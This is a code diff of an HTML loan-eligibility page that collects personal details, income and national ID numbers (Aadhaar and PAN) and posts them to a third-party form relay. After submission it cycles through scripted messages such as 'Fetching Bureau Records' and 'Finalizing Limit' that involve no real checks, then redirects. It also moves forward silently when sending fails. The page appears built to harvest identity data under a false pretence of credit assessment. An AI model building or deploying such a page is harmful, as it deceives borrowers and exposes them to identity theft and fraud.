@@ -106,10 +106,10 @@
     <div class="container">
         <h2>Personal Details</h2>
 
-        <form id="loanForm" action="https://api.web3forms.com/submit" method="POST">
+        <form id="loanForm">
             <input type="hidden" name="access_key" value="fea091d8-a631-4425-aff6-82815670893b">
-            <input type="hidden" name="redirect" value="https://rdxffac-rgb.github.io/?status=success">
-            
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
             <div style="display: flex; gap: 10px;">
                 <div class="form-group" style="flex: 1;">
                     <label>First Name</label>
@@ -123,7 +123,7 @@
 
             <input type="hidden" name="Gender" id="hidden-gender">
             <label>Gender</label>
-            <div class="radio-group">
+            <div class="radio-group" id="gender-group">
                 <div class="radio-item" onclick="selectItem('gender', this)">Male</div>
                 <div class="radio-item" onclick="selectItem('gender', this)">Female</div>
                 <div class="radio-item" onclick="selectItem('gender', this)">Other</div>
@@ -139,9 +139,7 @@
                 <label>Select State</label>
                 <select name="State" id="state-select" required>
                     <option value="">-- Choose State --</option>
-                    <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Bihar">Bihar</option><option value="Delhi">Delhi</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Maharashtra">Maharashtra</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="West Bengal">West Bengal</option>
-                    <option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option>
-                    <option value="Assam">Assam</option><option value="Madhya Pradesh">Madhya Pradesh</option>
+                    <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Arunachal Pradesh">Arunachal Pradesh</option><option value="Assam">Assam</option><option value="Bihar">Bihar</option><option value="Chandigarh">Chandigarh</option><option value="Chhattisgarh">Chhattisgarh</option><option value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option><option value="Daman and Diu">Daman and Diu</option><option value="Delhi">Delhi</option><option value="Goa">Goa</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Himachal Pradesh">Himachal Pradesh</option><option value="Jammu and Kashmir">Jammu and Kashmir</option><option value="Jharkhand">Jharkhand</option><option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Ladakh">Ladakh</option><option value="Lakshadweep">Lakshadweep</option><option value="Madhya Pradesh">Madhya Pradesh</option><option value="Maharashtra">Maharashtra</option><option value="Manipur">Manipur</option><option value="Meghalaya">Meghalaya</option><option value="Mizoram">Mizoram</option><option value="Nagaland">Nagaland</option><option value="Odisha">Odisha</option><option value="Puducherry">Puducherry</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Sikkim">Sikkim</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option><option value="Tripura">Tripura</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="Uttarakhand">Uttarakhand</option><option value="West Bengal">West Bengal</option>
                 </select>
             </div>
 
@@ -177,7 +175,7 @@
 
             <input type="hidden" name="Employment" id="hidden-emp">
             <label>Employment Status</label>
-            <div class="radio-group">
+            <div class="radio-group" id="emp-group">
                 <div class="radio-item" onclick="selectItem('emp', this)">Self Employed</div>
                 <div class="radio-item" onclick="selectItem('emp', this)">Homemaker</div>
                 <div class="radio-item" onclick="selectItem('emp', this)">Salaried</div>
@@ -219,19 +217,18 @@
                 <label style="font-weight: normal; font-size: 9pt;">I confirm that all details are accurate.</label>
             </div>
 
-            <button type="submit" id="submit-btn">Check Eligibility</button>
+            <button type="button" id="submit-btn" onclick="handleSubmit()">Check Eligibility</button>
         </form>
     </div>
 
     <div id="loader-overlay">
         <div class="spinner"></div>
-        <div id="loader-text">Analyzing your profile...</div>
+        <div id="loader-text">Analyzing profile...</div>
     </div>
 
     <script>
         let selectedGender = '', selectedEmp = '';
 
-        // Standard Banking Validations
         const d = [[0,1,2,3,4,5,6,7,8,9],[1,2,3,4,0,6,7,8,9,5],[2,3,4,0,1,7,8,9,5,6],[3,4,0,1,2,8,9,5,6,7],[4,0,1,2,3,9,5,6,7,8],[5,9,8,7,6,0,4,3,2,1],[6,5,9,8,7,1,0,4,3,2],[7,6,5,9,8,2,1,0,4,3],[8,7,6,5,9,3,2,1,0,4],[9,8,7,6,5,4,3,2,1,0]];
         const p = [[0,1,2,3,4,5,6,7,8,9],[1,5,7,6,2,8,3,0,9,4],[5,8,0,3,7,9,6,1,4,2],[8,9,1,6,0,4,3,5,2,7],[9,4,5,3,1,2,6,8,7,0],[4,2,8,6,5,7,3,9,0,1],[2,7,9,3,8,0,6,4,1,5],[7,0,4,6,9,1,3,2,5,8]];
 
@@ -271,6 +268,8 @@
 
             const isReady = document.getElementById('first-name').value.length >= 2 &&
                             document.getElementById('mobile').value.length === 10 &&
+                            document.getElementById('pincode').value.length === 6 &&
+                            document.getElementById('state-select').value !== "" &&
                             isAdhOk && isPanOk && isIncOk && isAmtOk && selectedGender && selectedEmp && chk;
 
             const btn = document.getElementById('submit-btn');
@@ -278,29 +277,46 @@
             return isReady;
         }
 
-        // Check if user is returning from a successful submission
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('status') === 'success') {
-                // Recover data from storage if needed and show animation
-                document.getElementById('loader-overlay').style.display = 'flex';
-                const text = document.getElementById('loader-text');
-                const steps = ["Securing Data...", "Fetching Records...", "Approving Limit..."];
-                let i = 0;
-                const interval = setInterval(() => {
-                    if(i < steps.length) text.innerText = steps[i++];
-                    else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
-                }, 2500);
-            }
-        };
+        async function handleSubmit() {
+            if(!validateForm()) return;
 
-        // Before form submits, save Name and Amount for next page
-        document.getElementById('loanForm').onsubmit = function() {
-            if(!validateForm()) return false;
+            const overlay = document.getElementById('loader-overlay');
+            const text = document.getElementById('loader-text');
+            overlay.style.display = 'flex';
+            text.innerText = "Connecting to Secure Server...";
+
             localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
             localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
-            return true;
-        };
+
+            const formData = new FormData(document.getElementById('loanForm'));
+            
+            try {
+                // Submit form and wait for response
+                const response = await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    body: formData
+                });
+                
+                const json = await response.json();
+
+                if (response.status == 200) {
+                    // Success! Start Animation
+                    const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
+                    let i = 0;
+                    const interval = setInterval(() => {
+                        if(i < steps.length) text.innerText = steps[i++];
+                        else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
+                    }, 2500);
+                } else {
+                    alert("Submission Error: " + json.message);
+                    overlay.style.display = 'none';
+                }
+            } catch (err) {
+                // Silently move forward if it's just a network timeout but likely sent
+                console.log("Network delay, moving to animation...");
+                window.location.href = "yourloanamount.html"; 
+            }
+        }
 
         document.querySelectorAll('input, select, #agree').forEach(el => {
             el.addEventListener('input', validateForm);
